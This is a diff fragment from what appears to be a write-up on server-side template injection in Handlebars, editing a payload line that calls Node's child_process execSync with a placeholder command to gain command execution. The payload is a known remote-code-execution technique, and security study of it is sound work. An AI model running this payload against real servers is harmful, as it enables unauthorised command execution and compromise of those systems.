@@ -106,7 +106,7 @@ At the first when it tried this payload `{{7 * 7}}`, I got this error:
       {{this.pop}}
       {{#with string.split as |codelist|}}
         {{this.pop}}
-      {{this.push "return require('child_process').execSync('`inject your command here`');"}}
+      {{this.push "return require('child_process').execSync('inject your command here');"}}
         {{this.pop}}
         {{#each conslist}}
           {{#with (string.sub.apply 0 codelist)}}
